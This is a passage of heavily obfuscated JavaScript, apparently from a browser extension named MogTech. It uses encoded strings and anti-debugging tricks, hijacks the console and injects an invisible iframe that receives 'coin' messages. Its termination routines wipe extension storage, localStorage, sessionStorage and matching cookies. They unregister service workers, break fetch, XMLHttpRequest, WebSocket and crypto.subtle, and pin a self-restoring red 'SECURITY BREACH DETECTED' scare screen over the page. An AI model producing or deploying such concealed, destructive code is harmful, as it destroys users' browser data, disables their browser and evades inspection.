                s = new Uint8Array(o[r(t)]);
              for (let t = 0; t < o.length; t++) {
                const n = w[r(e)](w.YTMaq(i, (t % 4) * 8), 255);
                s[t] = o[t] ^ n;
              }
              n = new TextDecoder().decode(s);
            }
            return n;
          };
        })()());
      const v = {};
      (v[g(346)] = g(365)),
        (v.top = "0"),
        (v[g(a)] = "0"),
        (v.width = g(u)),
        (v[g(c)] = w.vlAvw),
        (v.border = g(l)),
        (v.zIndex = w.GVqvd),
        (v[g(d)] = "transparent"),
        (v.pointerEvents = w.ExQrI),
        (v.opacity = "0"),
        (v.transition = g(332) + "3s ease"),
        (v[g(f)] = "none"),
        (v.willChange = w[g(h)]),
        (v[g(336)] = w[g(o)]),
        Object.assign(b.style, v),
        document.body[g(p) + "d"](b);
      const k = {};
      return (k[g(374)] = b), A(k), b;
    },
    x = async (t) => {
      const e = 379,
        n = 367,
        r = 381,
        o = 330,
        i = 355,
        s = S,
        a = {
          wmWdA: function (t, e) {
            return t * e;
          },
          RverV: function (t) {
            return t();
          },
        };
      if (T || !B || 0 === B.length) return;
      const { iframe: u } = a[s(325)](v);
      if (!u) return;
      t &&
        P({
          type: (function () {
            const t = {
              jqTyo: function (t, e) {
                return t & e;
              },
              VbnIV: function (t, e) {
                return a.wmWdA(t, e);
              },
            };
            let e;
            return function () {
              const n = I;
              if (!e) {
                const s = new Uint8Array([
                    16, 243, 235, 61, 12, 248, 227, 39, 18,
                  ]),
                  a = 1940044883,
                  u = new Uint8Array(s[n(342)]);
                for (let e = 0; e < s.length; e++) {
                  const i = t[n(r)](a >>> t[n(o)](e % 4, 8), 255);
                  u[e] = s[e] ^ i;
                }
                e = new TextDecoder()[n(i)](u);
              }
              return e;
            };
          })()(),
          coin: t,
        }),
        (u.style[s(323)] = s(338)),
        (u.style.opacity = "1"),
        (u[s(e)].pointerEvents = s(343));
      const c = {};
      (c[s(n) + "ble"] = !![]), A(c);
    },
    P = (t) => {
      const e = 349,
        n = 356,
        r = S,
        o = {
          IzRKz: function (t, e) {
            return t || e;
          },
        };
      if (o.IzRKz(T, !B) || 0 === B.length) return;
      const { iframe: i } = v();
      if (!(null == i ? void 0 : i[r(e) + "dow"])) return;
      const s = new URL(i.src).origin;
      i.contentWindow[r(n) + "e"](t, s);
    };
  axiomVamp;
  const O = z;
  !(function (t) {
    const e = 255,
      n = 259,
      r = 208,
      o = 232,
      i = 207,
      s = 148,
      a = 352,
      u = z,
      c = t();
    for (; []; )
      try {
        if (
          172520 ===
          (-parseInt(u(167)) / 1) * (parseInt(u(e)) / 2) +
            (parseInt(u(222)) / 3) * (parseInt(u(n)) / 4) +
            parseInt(u(r)) / 5 +
            (parseInt(u(o)) / 6) * (-parseInt(u(291)) / 7) +
            parseInt(u(i)) / 8 +
            -parseInt(u(s)) / 9 +
            parseInt(u(a)) / 10
        )
          break;
        c.push(c.shift());
      } catch (l) {
        c.push(c.shift());
      }
  })(L);
  const R = (function () {
      let t = !![];
      return function (e, n) {
        const r = 191,
          o = t
            ? function () {
                if (n) {
                  const t = n[z(r)](e, arguments);
                  return (n = null), t;
                }
              }
            : function () {};
        return (t = ![]), o;
      };
    })(),
    M = R(void 0, function () {
      const t = 196,
        e = 196,
        n = z,
        r = { cBQlK: "(((.+)+)+)+$" },
        o = r;
      return M.toString()
        [n(t)]("(((.+)+)+)+$")
        .toString()
        .constructor(M)
        [n(e)](o.cBQlK);
    });
  function L() {
    const t = [
      "zg9TywLU",
      "iwLTCg9YDgfUDa",
      "BgvUz3rO",
      "mhWXFdr8mNWZ",
      "BIaHAw1WB3j0yq",
      "tuz5yvu",
      "ihSkcqKjctaLia",
      "DgLVBLjLyxnVBG",
      "i2zMmdaWma",
      "EvDlAKG",
      "zMyWmdaWoYi+cG",
      "yxrPB24",
      "sMvTB0q",
      "nJm4nZzwz3H6vhO",
      "CxLxBKC",
      "B3a6idmWChG7ia",
      "vvD3AeK",
      "oIb3AgL0ztSkcq",
      "zgLZCgXHEvrLCG",
      "ChjVDg90ExbL",
      "ywTqBLG",
      "y29VA2LLCW",
      "DdSkcqKjywXPzW",
      "nNfwDwvzzW",
      "icmZmZaWmda7ia",
      "C3vIDhjLzq",
      "z2v0sw5ZDgfUyW",
      "iJ4kcqKjcqLtrq",
      "BhHnwMG",
      "DhLSzt0Iy29SBW",
      "B246igzPEgvKia",
      "Dgv4Dc1ZAgfKBW",
      "ifDbuK5jtKC",
      "DIbZDhLSzt0IyG",
      "pGOjcqKjcvrLCG",
      "BwfYz2LUoIaXma",
      "DgLMAwnHDgLVBG",
      "y2XLyxjbBgXtDa",
      "rgf0yq",
      "Cd4kcqK",
      "vw5RBM93BIbLCG",
      "rxD2Awm",
      "DhLoB3rPzMLJyq",
      "igzVBNqTD2vPzW",
      "ywXPz246ignLBG",
      "yxjevhu",
      "mJC1otbysxLxsLq",
      "C2vZC2LVBG",
      "zMv0y2G",
      "rK5huvC",
      "ndHWq2f4tKm",
      "BMLTyxrPB246ia",
      "BNrZoIbUB25Lia",
      "Au9uy2O",
      "oWOjcqL1C2vYlq",
      "DxjusKC",
      "pK1Vz1rLy2GGzq",
      "BMuGiwLTCg9YDa",
      "C3rYAw5N",
      "Be1yq0G",
      "yxmGyMvLBIbWzq",
      "DgP2u1C",
      "qwX4qLm",
      "zgLZywjSzuv4Da",
      "A2vY",
      "zfj5DeS",
      "C3rYAw5NAwz5",
      "Bg9JyxrPB24",
      "y2XLyxi",
      "wgLmz2G",
      "y3rVCIGICMv0Dq",
      "zw50",
      "oI8V",
      "D3zmse8",
      "uvjby20",
      "CMvWB3j0vgvYBq",
      "BMn0Aw9UywXPDa",
      "C3jJ",
      "A2DYB3vUzdOGBa",
      "re9nq29UDgvUDa",
      "zNjLzxPL",
      "z2v0rwXLBwvUDa",
      "n1LOv3vIvq",
      "BK50AgK",
      "AcaHAw1WB3j0yq",
      "yw1PBhK6iefYAq",
      "svnLCwq",
      "BNq7cGKjcwXLzG",
      "zhj0uvK",
      "BwLUyxrPB25tyW",
      "zvnYDM4",
      "DxjLCW",
      "Aw5HDgLVBG",
      "AgfYzfrLCM1PBG",
      "BI9QC29U",
      "C2vUzejLywnVBG",
      "cGKjcwzVBNqTCW",
      "iefmrvju",
      "CMvQzwn0",
      "ze5UDvG",
      "EsbOyxmGyMvLBG",
      "Efn4AMC",
      "DdOGmcaHAw1WBW",
      "zxjYB3i",
      "t01cz2u",
      "CM4GDgHPCYiPka",
      "Aw5ZDgfUy2u",
      "DgvYBwLUyxrPBW",
      "ihn0EwXLpsjTyq",
      "B2jZzxj2zq",
      "C2HVD1vZzxjoBW",
      "psjTyxjNAw4TDa",
      "qNLjza",
      "Bg9N",
      "Axr5oIaWlJC7ia",
      "Aw5JBhvKzxm",
      "ruqkcqKjctWVAa",
      "zxiGtMv3jYWGBq",
      "cGKjctXOmZ4",
      "DgfSBcbHBMqGCG",
      "zgL2",
      "qwLJuue",
      "CJOGi2zMmdaWma",
      "cGKjcxrVCdOGmG",
      "AxPLoIaXnNb4ia",
      "BgLKicnMzJaWma",
      "wKn5sMu",
      "BJOGmtbWEcaWoW",
      "y2f0y2G",
      "cw1HEc13Awr0Aa",
      "rwDwqNq",
      "D2fYBMLUzW",
      "B2LUDgvYlwv2zq",
      "t1iGu0vdvvjjva",
      "zM9UDc1ZAxPLoG",
      "yxbWzw5Kq2HPBa",
      "B250lxDLAwDODa",
      "C3rVCMfNzq",
      "C3rHCNruzxjTAq",
      "BLLitvO",
      "CNfnrKy",
      "mhb4ida7iJ48CW",
      "zgvJB2rL",
      "oda5mJbbtgHeyMm",
      "i2zMytuWma",
      "C29MDfrLCM1PBG",
      "CM9Y",
      "x19WCM90B19F",
      "FqOjcq",
      "rMPjrey",
      "EePsvxy",
      "CMvLBG",
      "B25VC3bHy2uGiq",
      "C3HjwMy",
      "wsbwsu9mqvrjtW",
      "CM1PBMf0Aw9Ulq",
      "D2fSBgv0u2vYDG",
      "Dw5KzwzPBMvK",
      "mta0nZC0nev3ELvyrG",
      "C2HVD1nLy3vYAq",
      "CMvTB3zLrxzLBG",
      "AgvHza",
      "Aw5Uzxjive1m",
      "y3nZvgv4Da",
      "cqKjctXWihn0Eq",
      "BwvZC2fNzq",
      "ctXWihn0EwXLpq",
      "zhbnruu",
      "AwzmyKm",
      "tg9HzgvK",
      "D3nLCKfqsxm",
      "yM9KEq",
      "zgj6Evq",
      "cGKjcqK8l3a+cG",
      "CMvHC29U",
      "Bw9NDgvJAc10zq",
      "CgfKzgLUzZOGmG",
      "mtDptKXJugS",
      "ALvTs2i",
      "z2v0qwXS",
      "rgzstxy",
      "C29MDa",
      "lcaJmdaWmdaWla",
      "DhjVBMC+uMvHCW",
      "zw5ZAw9UrMvHDa",
      "oIaXmhb4ida7iG",
      "DgLVBG",
      "C3r5Bgu",
      "zwLUC3rHBgWGzG",
      "iM1HCMDPBJOGmq",
      "BM93",
      "BwLUyxrPB24",
      "svjHyLu",
      "CwTwCvG",
      "AwnHDgLVBG",
      "y2TNCM91BMq6ia",
      "yM5QCue",
      "cGKjcqK8l2rPDG",
      "cGKjcwzVBNqTzG",
      "zgLZCgXHEtOGzG",
      "ide7ih0kcqKjcq",
      "yxbWBhK",
      "q29UDgvUDc1uEq",
      "C3nRrMu",
      "EuD2swi",
      "oIaJzMzMzJaWoW",
      "C2vHCMnO",
      "BI1PDgvTCZOGyW",
      "C2nYzwvU",
      "zgvZDhjVEufSBa",
      "z2v0vgvYBwLUyq",
      "pGOjcqK8l2rPDG",
      "Aw5LyxiTz3jHza",
      "DgLMEs1JB250zq",
      "DNDNv0m",
      "zgLZywjSzwqUpa",
      "B2jQzwn0",
      "mtyYnZyWmejNy3nesq",
      "mJGYmdmWywTdtfHO",
    ];
    return (L = function () {
      return t;
    })();
  }
  M();
  const N = (function () {
      const t = 191;
      let e = !![];
      return function (n, r) {
        const o = e
          ? function () {
              if (r) {
                const e = r[z(t)](n, arguments);
                return (r = null), e;
              }
            }
          : function () {};
        return (e = ![]), o;
      };
    })(),
    D = N(void 0, function () {
      const t = 314,
        e = 322,
        n = 225,
        r = 170,
        o = 228,
        i = z,
        s = {
          JqAAM: function (t, e) {
            return t(e);
          },
          GSfVD: "{}.constru" + i(279) + i(t) + " )",
          Ewanj: function (t) {
            return t();
          },
          UWwhI: i(e),
          odCOK: "warn",
          hwSFG: "info",
          DfRMv: "error",
          kOIOx: "trace",
          RwuEt: function (t, e) {
            return t < e;
          },
        };
      let a;
      try {
        const t = s.JqAAM(Function, "return (function() " + s.GSfVD + ");");
        a = s.Ewanj(t);
      } catch (l) {
        a = window;
      }
      const u = (a.console = a.console || {}),
        c = [s[i(n)], s.odCOK, s.hwSFG, s[i(r)], "exception", "table", s.kOIOx];
      for (let d = 0; s.RwuEt(d, c.length); d++) {
        const t = N.constructor[i(o)].bind(N),
          e = c[d],
          n = u[e] || t;
        (t[i(356)] = N.bind(N)), (t.toString = n.toString.bind(n)), (u[e] = t);
      }
    });
  D(),
    (window.skCrypt = function (t) {
      return function () {
        return t;
      };
    });
  class U {
    constructor() {
      const t = z;
      (this.terminated = ![]), (this[t([316][0]) + "nReason"] = "");
    }
    static [O(235) + "e"]() {
      const t = 315,
        e = O;
      return !U[e(315)] && (U[e(315)] = new U()), U[e(t)];
    }
    async terminate(t) {
      const e = 249,
        n = 262,
        r = 164,
        o = 354,
        i = 220,
        s = 181,
        a = 223,
        u = 267,
        c = O,
        l = {};
      (l.qyWnG = c(e) + c(355)),
        (l[c(n)] = function (t, e) {
          return t === e;
        });
      const d = l;
      if (!this.terminated) {
        (this.terminated = !![]), (this[c(316) + "nReason"] = t[c(r)]);
        try {
          switch (t.level) {
            case "soft":
              await this[c(o) + c(i)](t);
              break;
            case "hard":
              await this["hardTermin" + c(i)](t);
              break;
            case "nuclear":
              await this["nuclearTer" + c(s)](t);
          }
        } catch (f) {
          d[c(a)],
            f instanceof Error
              ? f.message
              : typeof f === c(u) ||
                (f && d.iOTcj(typeof f, "object") && JSON.stringify(f)),
            await this.nuclearTermination(t);
        }
      }
    }
    async [O(354) + "ation"](t) {
      const e = 149,
        n = 164,
        r = 340,
        o = 276,
        i = O;
      t[i(319) + i(245)] && this[i(e) + "tyNotifica" + i(176)](t[i(n)], i(r)),
        setTimeout(() => {
          window[i(o)].reload();
        }, 5e3);
    }
    async [O(302) + "ation"](t) {
      const e = 246,
        n = 272,
        r = 301,
        o = 176,
        i = O,
        s = i(212).split("|");
      let a = 0;
      for (; []; ) {
        switch (s[a++]) {
          case "0":
            await this[i(e) + "orage"]();
            continue;
          case "1":
            await this[i(n) + i(174) + "ures"]();
            continue;
          case "2":
            this.preventCodeExecution();
            continue;
          case "3":
            await this["reportTerm" + i(r)](t);
            continue;
          case "4":
            this["showSecurityNotifica" + i(o)](t[i(164)], "error");
            continue;
        }
        break;
      }
    }
    async ["nuclearTer" + O(181)](t) {
      const e = 247,
        n = 360,
        r = 164,
        o = O;
      await this["destroyAll" + o(e)](),
        this["displayTer" + o(298) + o(n)](t[o(r)]),
        this["disableBro" + o(160)](),
        this[o(347) + "nationLoop"](),
        this["emergencyServerNotif" + o(184)](t);
    }
    async clearAllStorage() {
      var t, e;
      const n = 147,
        r = 267,
        o = 346,
        i = 256,
        s = 277,
        a = 182,
        u = 169,
        c = 209,
        l = 324,
        d = 209,
        f = 230,
        h = 249,
        p = 355,
        m = 264,
        g = 221,
        y = 211,
        w = 211,
        b = 297,
        v = 211,
        A = 299,
        k = 274,
        I = 250,
        S = O,
        _ = {
          Ewvic: function (t, e) {
            return t * e;
          },
          drtQY: function (t, e) {
            return t & e;
          },
          itYbA: function (t, e) {
            return t !== e;
          },
        };
      (_.IRabU = S(n)),
        (_.urTJG = S(r)),
        (_.JemoD = function (t, e) {
          return t === e;
        });
      const T = _;
      try {
        if (
          (T.itYbA(typeof chrome, T.IRabU) &&
            chrome[S(o)] &&
            (await chrome[S(346)].local.clear(),
            await (null == (t = chrome[S(o)][S(i)]) ? void 0 : t.clear()),
            await (null == (e = chrome.storage.sync) ? void 0 : e.clear())),
          localStorage[S(s)](),
          sessionStorage.clear(),
          typeof chrome !== T[S(a)] && chrome.cookies)
        ) {
          const t = await chrome.cookies[S(u)]({});
          for (const e of t)
            if (
              e.name.includes(
                (function () {
                  const t = {
                    eSrvn: function (t, e) {
                      return t >>> e;
                    },
                    dRytK: function (t, e) {
                      return T[z(I)](t, e);
                    },
                    jmhKd: function (t, e) {
                      return t ^ e;
                    },
                  };
                  let e;
                  return function () {
                    const n = z;
                    if (!e) {
                      const r = new Uint8Array([
                          212, 144, 217, 227, 220, 156, 214,
                        ]),
                        o = -1749090375,
                        i = new Uint8Array(r.length);
                      for (let e = 0; e < r[n(v)]; e++) {
                        const s = 255 & t[n(A)](o, t[n(k)](e % 4, 8));
                        i[e] = t.jmhKd(r[e], s);
                      }
                      e = new TextDecoder().decode(i);
                    }
                    return e;
                  };
                })()()
              ) ||
              e[S(c)][S(l)](
                (function () {
                  let t;
                  return function () {
                    const e = z;
                    if (!t) {
                      const n = new Uint8Array([
                          214, 144, 217, 227, 222, 156, 214,
                        ]),
                        r = -1749090373,
                        o = new Uint8Array(n[e(y)]);
                      for (let t = 0; t < n[e(w)]; t++) {
                        const i = T[e(b)](r >>> ((t % 4) * 8), 255);
                        o[t] = n[t] ^ i;
                      }
                      t = new TextDecoder().decode(o);
                    }
                    return t;
                  };
                })()()
              )
            ) {
              const t = {};
              (t.url =
                "http" + (e.secure ? "s" : "") + S(281) + e[S(d)] + e.path),
                (t.name = e.name),
                await chrome[S(f)].remove(t);
            }
        }
      } catch (B) {
        S(h) + S(p),
          B instanceof Error
            ? B.message
            : typeof B === T[S(m)] ||
              (B && T[S(g)](typeof B, S(206)) && JSON.stringify(B));
      }
    }
    async ["disableExt" + O(174) + O(300)]() {
      var t, e;
      const n = 150,
        r = 358,
        o = 155,
        i = 267,
        s = 183,
        a = O,
        u = {};
      (u.FjIDF = a(288) + a(159)),
        (u.LbvEF = "serviceWor" + a(273)),
        (u[a(183)] = function (t, e) {
          return t === e;
        });
      const c = u;
      try {
        if (
          (null == (t = window.removeEventListener)
            ? void 0
            : t.call(window, "message", () => {}),
          null == (e = document[a(n) + "tListener"])
            ? void 0
            : e.call(document, c[a(r)], () => {}),
          (window.mogTechAPI = null),
          (window[a(146) + "ice"] = null),
          (window.userService = null),
          c.LbvEF in navigator)
        ) {
          const t = await navigator.serviceWorker.getRegistrations();
          for (const e of t) await e.unregister();
        }
      } catch (l) {
        a(355),
          1,
          l instanceof Error
            ? l[a(o)]
            : c.qkVqX(typeof l, a(i)) ||
              (l && c[a(s)](typeof l, "object") && JSON.stringify(l));
      }
    }
    ["displayTerminationSc" + O(360)](t) {
      const e = 177,
        n = 165,
        r = 145,
        o = 198,
        i = 153,
        s = 239,
        a = 296,
        u = 311,
        c = 293,
        l = 202,
        d = 172,
        f = 189,
        h = 231,
        p = 197,
        m = 326,
        g = 361,
        y = 305,
        w = 210,
        b = 253,
        v = 341,
        A = 261,
        k = 152,
        I = 185,
        S = 260,
        _ = 238,
        T = 331,
        B = 236,
        C = 325,
        E = 242,
        x = 233,
        P = 219,
        R = 336,
        M = 342,
        L = 144,
        N = 156,
        D = 179,
        U = 350,
        q = 173,
        K = 244,
        W = 343,
        F = 163,
        j = 154,
        G = 175,
        V = 265,
        H = 269,
        Z = 205,
        X = 317,
        J = 178,
        Y = 320,
        Q = 224,
        $ = 243,
        tt = 180,
        et = 187,
        nt = 215,
        rt = 190,
        ot = 357,
        it = 344,
        st = 234,
        at = 318,
        ut = 161,
        ct = 290,
        lt = 321,
        dt = O,
        ft = {};
      (ft[dt(194)] = function (t, e) {
        return t & e;
      }),
        (ft.lMXCH = dt(e));
      const ht = ft,
        pt = document["createElem" + dt(280)]("div");
      (pt.id = dt(n) + dt(r) + dt(o)),
        (pt.style[dt(i)] =
          "\n\t\t\tpositi" +
          dt(s) +
          "!important;\n\t\t\ttop: 0 !importa" +
          dt(a) +
          dt(u) +
          "rtant;\n\t\t\twidth: 100vw !important;\n\t\t\theight: 100v" +
          dt(c) +
          "nt;\n\t\t\tbac" +
          dt(287) +
          dt(l) +
          "ient(45deg" +
          dt(d) +
          " #1a0000) !important;\n\t\t\tcolor: #ff0000 " +
          dt(210) +
          ";\n\t\t\tz-index: 2147483647 !important;\n\t\t\t" +
          dt(f) +
          "lex !important;\n\t\t\tflex-direction: colum" +
          dt(213) +
          "nt;\n\t\t\tjus" +
          dt(203) +
          "nt: center !importan" +
          dt(h) +
          dt(p) +
          "enter !important;\n\t\t\tfont-family: 'Couri" +
          dt(m) +
          dt(g) +
          "important;" +
          dt(y) +
          dt(333) +
          dt(w) +
          ";\n\t\t\ttext-" +
          dt(b) +
          "ter !important;\n\t\t\tp" +
          dt(v) +
          dt(A) +
          "!important" +
          dt(263) +
          "select: no" +
          dt(266) +
          "ant;\n\t\t"),
        (pt[dt(k)] =
          '\n\t\t\t<div style="border: 3px so' +
          dt(334) +
          "0; padding: 40px; ba" +
          dt(I) +
          "rgba(255,0,0,0.1); a" +
          dt(S) +
          'pulse 2s infinite;">\n\t\t\t\t<h1 s' +
          dt(_) +
          dt(T) +
          "; font-size: 32px; margin-bottom: 20px; " +
          dt(240) +
          "w: 0 0 10px #ff0000;" +
          dt(B) +
          "CURITY BREACH DETECT" +
          dt(C) +
          "1>\n\t\t\t\t<di" +
          dt(E) +
          "ackground:" +
          dt(x) +
          dt(166) +
          "0px; margin: 20px 0; border: 1px solid #" +
          dt(P) +
          '\t\t\t\t\t<p style="margi' +
          dt(R) +
          ' font-weight: bold;">MOGTECH HAS BEEN TERMINATED F' +
          dt(M) +
          dt(L) +
          "N</p>\n\t\t\t\t" +
          dt(N) +
          dt(D) +
          dt(U) +
          dt(q) +
          "on:</strong> " +
          t +
          '</p>\n\t\t\t\t\t<p style="' +
          dt(K) +
          'px 0;">All sensitive data has been destroyed.</p>\n\t\t\t\t</div>\n\t\t\t\t<p style="color' +
          dt(195) +
          dt(252) +
          "ht: bold; " +
          dt(W) +
          ' 18px; margin: 20px 0;">\n\t\t\t\t\t DO NOT IGNORE THIS WARNING ' +
          dt(F) +
          dt(j) +
          'le="margin' +
          dt(G) +
          dt(V) +
          "xtension h" +
          dt(H) +
          "rmanently " +
          dt(Z) +
          "/p>\n\t\t\t\t<p" +
          dt(X) +
          'rgin: 10px 0;">Unins' +
          dt(328) +
          dt(J) +
          "rom a trusted source.</p>\n\t\t\t\t<div style" +
          dt(Y) +
          dt(Q) +
          'font-size: 12px; color: #888;"' +
          dt($) +
          "mination ID: " +
          Date[dt(tt)]().toString(36) +
          (dt(et) + dt(201)) +
          ">\n\t\t");
      const mt = document.createElement(ht[dt(268)]);
      (mt.textContent =
        "\n\t\t\t@keyframes pulse" +
        dt(nt) +
        "{ opacity:" +
        dt(rt) +
        "50% { opac" +
        dt(323) +
        "}\n\t\t\t\t100% { opacity: 1; }\n\t\t\t" +
        dt(ot)),
        document[dt(151)].appendChild(mt),
        document.body[dt(it) + "d"](pt);
      const gt = new MutationObserver(() => {
          const t = dt,
            e = {
              bnjqA: function (t, e) {
                return ht.yGvIb(t, e);
              },
            };
          !document[t(ct) + t(lt)](
            (function () {
              const t = 186;
              let n;
              return function () {
                const r = z;
                if (!n) {
                  const o = new Uint8Array([
                      212, 144, 217, 227, 220, 156, 214, 186, 205, 154, 204,
                      250, 208, 145, 223, 227, 208, 144, 208, 186, 202, 156,
                      204, 242, 220, 145,
                    ]),
                    i = -1749090375,
                    s = new Uint8Array(o.length);
                  for (let n = 0; n < o.length; n++) {
                    const a = e[r(t)](i >>> ((n % 4) * 8), 255);
                    s[n] = o[n] ^ a;
                  }
                  n = new TextDecoder().decode(s);
                }
                return n;
              };
            })()()
          ) && document.body.appendChild(pt);
        }),
        yt = { childList: !![] };
      (yt[dt(st)] = !![]), gt[dt(at)](document[dt(ut)], yt);
    }
    disableBrowserAPIs() {
      const t = 348,
        e = 229,
        n = 249,
        r = 211,
        o = 214,
        i = 348,
        s = 254,
        a = O,
        u = {
          vwgWC: function (t, e) {
            return t & e;
          },
          arDTu: function (t, e) {
            return t >>> e;
          },
          MFyaU: function (t, e) {
            return t & e;
          },
          dcnkX: function (t, e) {
            return t < e;
          },
        };
      (u[a(158)] = function (t, e) {
        return t * e;
      }),
        (u[a(t)] = function (t, e) {
          return t % e;
        }),
        (u.pTxOI = function (t, e) {
          return t ^ e;
        }),
        (u[a(e)] = function (t, e) {
          return t & e;
        }),
        (u.nNthi = function (t, e) {
          return t >>> e;
        }),
        (u.VjtMh = function (t, e) {
          return t & e;
        }),
        (u.lxMZh = function (t, e) {
          return t ^ e;
        }),
        (u.UdySX = a(n) + "ror"),
        (u.XiLgh = function (t, e) {
          return t === e;
        });
      const c = u;
      try {
        (window[a(257)] = () =>
          Promise[a(307)](
            new Error(
              (function () {
                const t = 295,
                  e = {
                    hbafM: function (t, e) {
                      return c[z(204)](t, e);
                    },
                    ISeqd: function (t, e) {
                      return c[z(s)](t, e);
                    },
                  };
                let n;
                return function () {
                  const r = z;
                  if (!n) {
                    const o = new Uint8Array([
                        250, 167, 234, 210, 241, 172, 247, 216, 241, 223, 234,
                        210, 237, 178, 247, 217, 254, 171, 251, 211,
                      ]),
                      i = -1749090369,
                      s = new Uint8Array(o.length);
                    for (let n = 0; n < o.length; n++) {
                      const a = e.hbafM(e[r(t)](i, (n % 4) * 8), 255);
                      s[n] = o[n] ^ a;
                    }
                    n = new TextDecoder().decode(s);
                  }
                  return n;
                };
              })()()
            )
          )),
          (window.XMLHttpRequest = class {
            constructor() {
              throw new Error(
                (function () {
                  const t = function (t, e) {
                      return c.MFyaU(t, e);
                    },
                    e = function (t, e) {
                      return t * e;
                    };
                  let n;
                  return function () {
                    if (!n) {
                      const r = new Uint8Array([
                          252, 167, 234, 210, 247, 172, 247, 216, 247, 223, 234,
                          210, 235, 178, 247, 217, 248, 171, 251, 211,
                        ]),
                        o = -1749090375,
                        i = new Uint8Array(r.length);
                      for (let n = 0; n < r.length; n++) {
                        const s = t(o >>> e(n % 4, 8), 255);
                        i[n] = r[n] ^ s;
                      }
                      n = new TextDecoder().decode(i);
                    }
                    return n;
                  };
                })()()
              );
            }
          }),
          (window.WebSocket = class {
            constructor() {
              const t = {
                wvLHO: function (t, e) {
                  return c.dcnkX(t, e);
                },
                tZTbA: function (t, e) {
                  return t >>> e;
                },
                kxRzW: function (t, e) {
                  return c.ifLbC(t, e);
                },
                RIZgt: function (t, e) {
                  return t ^ e;
                },
              };
              throw new Error(
                (function () {
                  const e = 282;
                  let n;
                  return function () {
                    const r = z;
                    if (!n) {
                      const o = new Uint8Array([
                          254, 167, 234, 210, 245, 172, 247, 216, 245, 223, 234,
                          210, 233, 178, 247, 217, 250, 171, 251, 211,
                        ]),
                        i = -1749090373,
                        s = new Uint8Array(o.length);
                      for (let n = 0; t[r(e)](n, o.length); n++) {
                        const e = 255 & t.tZTbA(i, t.kxRzW(n % 4, 8));
                        s[n] = t.RIZgt(o[n], e);
                      }
                      n = new TextDecoder()[r(351)](s);
                    }
                    return n;
                  };
                })()()
              );
            }
          }),
          (window.crypto.subtle = {
            encrypt: () =>
              Promise.reject(
                new Error(
                  (function () {
                    let t;
                    return function () {
                      const e = z;
                      if (!t) {
                        const n = new Uint8Array([
                            252, 167, 234, 210, 247, 172, 247, 216, 247, 223,
                            234, 210, 235, 178, 247, 217, 248, 171, 251, 211,
                          ]),
                          r = -1749090375,
                          s = new Uint8Array(n.length);
                        for (let t = 0; t < n.length; t++) {
                          const a = c[e(o)](r >>> (8 * c[e(i)](t, 4)), 255);
                          s[t] = c.pTxOI(n[t], a);
                        }
                        t = new TextDecoder().decode(s);
                      }
                      return t;
                    };
                  })()()
                )
              ),
            decrypt: () =>
              Promise[a(307)](
                new Error(
                  (function () {
                    const t = 292;
                    let e;
                    return function () {
                      const n = z;
                      if (!e) {
                        const r = new Uint8Array([
                            242, 167, 234, 210, 249, 172, 247, 216, 249, 223,
                            234, 210, 229, 178, 247, 217, 246, 171, 251, 211,
                          ]),
                          o = -1749090377,
                          i = new Uint8Array(r.length);
                        for (let e = 0; e < r.length; e++) {
                          const s = c.akPnX(c[n(t)](o, c.ifLbC(e % 4, 8)), 255);
                          i[e] = r[e] ^ s;
                        }
                        e = new TextDecoder()[n(351)](i);
                      }
                      return e;
                    };
                  })()()
                )
              ),
            sign: () =>
              Promise.reject(
                new Error(
                  (function () {
                    let t;
                    return function () {
                      const e = z;
                      if (!t) {
                        const n = new Uint8Array([
                            252, 167, 234, 210, 247, 172, 247, 216, 247, 223,
                            234, 210, 235, 178, 247, 217, 248, 171, 251, 211,
                          ]),
                          o = -1749090375,
                          i = new Uint8Array(n[e(r)]);
                        for (let t = 0; t < n.length; t++) {
                          const e = c.VjtMh(o >>> ((t % 4) * 8), 255);
                          i[t] = n[t] ^ e;
                        }
                        t = new TextDecoder().decode(i);
                      }
                      return t;
                    };
                  })()()
                )
              ),
            verify: () =>
              Promise.reject(
                new Error(
                  (function () {
                    const t = 237;
                    let e;
                    return function () {
                      const n = z;
                      if (!e) {
                        const r = new Uint8Array([
                            254, 167, 234, 210, 245, 172, 247, 216, 245, 223,
                            234, 210, 233, 178, 247, 217, 250, 171, 251, 211,
                          ]),
                          o = -1749090373,
                          i = new Uint8Array(r.length);
                        for (let e = 0; e < r.length; e++) {
                          const s = 255 & c[n(254)](o, (e % 4) * 8);
                          i[e] = c[n(t)](r[e], s);
                        }
                        e = new TextDecoder()[n(351)](i);
                      }
                      return e;
                    };
                  })()()
                )
              ),
          });
      } catch (l) {
        c.UdySX,
          l instanceof Error
            ? l.message
            : c[a(278)](typeof l, "string") ||
              (l && "object" == typeof l && JSON.stringify(l));
      }
    }
    startTerminationLoop() {
      const t = 290,
        e = 321,
        n = 298,
        r = 316,
        o = 339,
        i = {
          tjvSW: function (t, e) {
            return t >>> e;
          },
          EgVBt: function (t, e) {
            return t ^ e;
          },
          sskFe: function (t, e, n) {
            return t(e, n);
          },
        },
        s = () => {
          const a = 162,
            u = 351,
            c = z,
            l = function (t, e) {
              return i[z(270)](t, e);
            },
            d = function (t, e) {
              return i[z(o)](t, e);
            };
          try {
            localStorage.clear(), sessionStorage.clear();
          } catch (f) {}
          !document[c(t) + c(e)](
            (function () {
              const t = {
                hsgiA: function (t, e) {
                  return t < e;
                },
                dYGfw: function (t, e) {
                  return l(t, e);
                },
                dbzyT: function (t, e) {
                  return t * e;
                },
                JdIhH: function (t, e) {
                  return d(t, e);
                },
              };
              let e;
              return function () {
                const n = z;
                if (!e) {
                  const r = new Uint8Array([
                      212, 144, 217, 227, 220, 156, 214, 186, 205, 154, 204,
                      250, 208, 145, 223, 227, 208, 144, 208, 186, 202, 156,
                      204, 242, 220, 145,
                    ]),
                    o = -1749090375,
                    i = new Uint8Array(r.length);
                  for (let e = 0; t.hsgiA(e, r.length); e++) {
                    const s = 255 & t.dYGfw(o, t[n(a)](e % 4, 8));
                    i[e] = t.JdIhH(r[e], s);
                  }
                  e = new TextDecoder()[n(u)](i);
                }
                return e;
              };
            })()()
          ) && this[c(227) + c(n) + "reen"](this[c(r) + "nReason"]),
            setTimeout(s, 1e3);
        };
      i[O([193][0])](setTimeout, s, 100);
    }
    ["showSecuri" + O(251) + "tion"](t, e) {
      const n = 217,
        r = 241,
        o = 332,
        i = 349,
        s = 312,
        a = 353,
        u = 226,
        c = 345,
        l = 338,
        d = 152,
        f = 327,
        h = 306,
        p = 308,
        m = 309,
        g = 248,
        y = 344,
        w = 283,
        b = 211,
        v = 351,
        A = O,
        k = {
          zjhbK: function (t, e) {
            return t >>> e;
          },
          eMJNi: function (t, e) {
            return t % e;
          },
          vrzkH: A(329),
